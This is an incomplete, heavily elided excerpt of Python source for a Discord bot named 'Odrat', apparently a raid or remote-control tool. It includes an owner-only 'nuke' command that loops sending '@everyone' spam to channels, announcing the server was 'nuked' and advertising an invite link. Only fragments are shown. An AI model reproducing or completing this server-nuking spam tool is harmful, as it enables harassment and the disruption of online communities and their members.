...
print(color.LIGHTGREEN_EX + "Coded by DimZan - guns.lol/dimzan")
print(color.YELLOW + """
                         __    _                                   
                    _wr""        "-q__                             
                 _dP                 9m_     
...
q = y["your_id"]
ID = int(q)
print(color.RESET + "[~] Do od!help to get all commands")
...
async def help(ctx):
    if ctx.author.id == ID:
        embed = discord.Embed(
            title="This bot is running Odrat",
        ...
        embed.set_footer(text="Made by guns.lol/dimzan")
...
async def nuke(ctx, *, arg):
    if ctx.author.id == ID:
        ...
        while x >= 0:
            ...
            await ch.send(f"{arg} | Nuked and fcked by Odrat .gg/t86b986Ccr @everyone")
            x = int(x) - 1
